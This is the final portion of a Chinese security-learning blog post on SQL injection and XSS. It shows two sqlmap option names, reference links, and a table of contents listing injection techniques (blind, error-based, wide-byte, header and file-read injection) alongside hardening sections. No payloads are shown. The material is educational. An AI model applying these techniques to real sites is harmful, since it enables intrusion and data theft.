class="line"></span><br><span class="line"><span class="comment">--current-user(信息获取)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--flush-session（通用设置）</span></span><br></pre></td></tr></table></figure>












<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://jwt1399.top/posts/32179.html#toc-heading-17">https://jwt1399.top/posts/32179.html#toc-heading-17</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6036909.html">https://www.cnblogs.com/xishaonian/p/6036909.html</a></p>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000020402185?utm_source=sf-similar-article">https://segmentfault.com/a/1190000020402185?utm_source=sf-similar-article</a></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/01/26/kali%E6%B1%89%E5%8C%96/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2021-04-20 00:00:00
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%AE%89%E5%85%A8/" title="安全">
                        <b>#</b> 安全
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/04/20/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/%E7%96%91%E9%97%AE/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div class="post-catalog" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9Asql%E6%B3%A8%E5%85%A5"><span class="toc-text">一：sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="toc-text">什么是sql注入？？？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%85%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="toc-text">Ⅰ：数据库基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A"><span class="toc-text">sql中的注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%AD%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">sql中链接字符串的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B"><span class="toc-text">①注入简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">sql注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEsql%E6%95%B0%E6%8D%AE%E5%88%86%E7%B1%BB"><span class="toc-text">根据sql数据分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">1、整形注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">2、字符型注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEsql%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E5%88%86%E7%B1%BB"><span class="toc-text">根据sql注入语法分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%EF%BC%88Boolean-based-blind-SQL-injection%EF%BC%89"><span class="toc-text">1、布尔注入（Boolean-based blind SQL injection）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%EF%BC%88Time-based-blind-SQL-injection%EF%BC%89"><span class="toc-text">2、时间注入（Time-based blind SQL injection）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%88Union-query-SQL-injection%EF%BC%89"><span class="toc-text">3、联合注入（Union query SQL injection）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E5%A4%9A%E8%AF%AD%E5%8F%A5%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%88Stacted-queries-SQL-injection%EF%BC%89"><span class="toc-text">4、多语句查询注入（Stacted queries SQL injection）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88Error-based-SQL-injection%EF%BC%89"><span class="toc-text">5、报错注入（Error-based SQL injection）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%A7%8D%E7%B1%BB%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">其他种类注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">基于时间的盲注</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">发现注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-text">1、使用漏洞扫描工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E8%B0%B7%E6%AD%8Chacking%E5%AF%BB%E6%89%BE"><span class="toc-text">2、使用谷歌hacking寻找</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%85%A1%EF%BC%9A%E5%B0%9D%E8%AF%95sql%E6%B3%A8%E5%85%A5"><span class="toc-text">Ⅱ：尝试sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">1、手工注入思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%A4%8D%E7%8E%B0"><span class="toc-text">2、复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E9%A6%96%E5%85%88-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AD%98%E5%9C%A8%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-text">1、首先 判断是否存在注入，存在的注入点是字符型和数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%8C%9C%E8%A7%A3-SQL-%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">2.猜解 SQL 查询语句中的字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-text">3、确定显示字段的顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">4、获取当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="toc-text">5、获取数据库中的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">6、获取当前表中字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E4%B8%8B%E8%BD%BD%E6%95%B0%E6%8D%AE%EF%BC%88%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF%EF%BC%89"><span class="toc-text">7、下载数据（获取字段信息）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%85%A2%EF%BC%9A%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5%EF%BC%88%E5%BE%85%E6%B5%8B%E8%AF%95%EF%BC%89"><span class="toc-text">Ⅲ：使用sqlmap注入（待测试）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-text">1、sqlmap使用教程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96sql%E6%B3%A8%E5%85%A5"><span class="toc-text">其他sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81sql%E7%9B%B2%E6%B3%A8"><span class="toc-text">1、sql盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-text">手工盲注常用参数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-text">手工注入实现：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sqlmap%E5%AE%9E%E7%8E%B0%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">sqlmap实现布尔注入</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-text">手工实现：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81DNSlog%E6%B3%A8%E5%85%A5%EF%BC%88%E6%9C%89%E5%BE%85%E5%AD%A6%E4%B9%A0%EF%BC%89"><span class="toc-text">2、DNSlog注入（有待学习）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">3、宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-text">手工测试：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%EF%BC%9A"><span class="toc-text">使用sqlmap：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88%E9%9C%80%E8%A6%81%E8%A1%A5%E5%85%85%EF%BC%89"><span class="toc-text">4、报错注入（需要补充）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">floor报错注入&#x2F;双查询注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">updatexml报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">extractvalue报错注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">5、二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E5%BE%85%E5%AD%A6%E4%B9%A0%E2%80%93"><span class="toc-text">有待学习–&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">6、堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81http-head%E6%B3%A8%E5%85%A5"><span class="toc-text">7、http head注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="toc-text">XFF注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#UA%E6%B3%A8%E5%85%A5"><span class="toc-text">UA注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8%E3%80%81%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">8、读写文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95"><span class="toc-text">靶场记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%85%A3%EF%BC%9A%E5%8A%A0%E5%9B%BAsql"><span class="toc-text">Ⅳ：加固sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-text">附件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Axss%E6%B3%A8%E5%85%A5"><span class="toc-text">二：xss注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">攻击原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%88%86%E4%B8%BA%E4%B8%89%E5%A4%A7%E7%B1%BB"><span class="toc-text">主要分为三大类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-text">1、反射型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">2、存储型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81dome%E5%9E%8Bxss"><span class="toc-text">3、dome型xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95"><span class="toc-text">手动测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">1、反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">2、存储型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81dom%E5%BD%A2XSS"><span class="toc-text">3、dom形XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81XSS%E7%9B%B2%E6%89%93"><span class="toc-text">4、XSS盲打</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81XSS%E8%BF%87%E6%BB%A4"><span class="toc-text">5、XSS过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81xss%E4%B9%8Bhtmlspecialchars"><span class="toc-text">6、xss之htmlspecialchars</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E5%8A%A0%E5%9B%BA"><span class="toc-text">xss加固</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E4%B8%8A"><span class="toc-text">附上</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81MySql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">一、MySql注入常用函数</span></a></li></ol></li></ol>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        





      </div>
    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/xuehanlin">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="1346541136@qq.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="facebook" href="">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" href="">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="wechat" href="">
            <i class="iconfont icon-wechat"></i>
          </a>
        </li>
      
        <li>
          <a title="weibo" href="">
            <i class="iconfont icon-weibo"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/xuehanlin">Copyright © Oranges 2020</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/xuehanlin">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      
  <div class="search-icon" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索点什么好呢，您说搜啥就搜啥！">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




    </div>
  </body>
</html>
